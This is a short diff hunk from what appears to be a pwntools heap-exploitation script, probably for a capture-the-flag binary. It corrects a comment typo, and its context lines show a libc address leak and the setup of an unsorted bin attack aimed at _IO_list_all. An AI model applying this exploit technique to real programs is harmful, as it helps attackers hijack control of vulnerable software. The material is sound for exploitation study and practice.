@@ -52,7 +52,7 @@ p.recvuntil("aazx")
 libc_addr = u64(p.recv(6).ljust(8,"\0")) - 0x389b78 # ./main_arena libc + 88
 log.success("libc_addr is -> "+ hex( libc_addr ))
 
-# unsorted bin attach
+# unsorted bin attack
 fd = 0
 bk = libc_addr + 0x38a520 - 0x10 # _IO_list_all
 payload = flat([
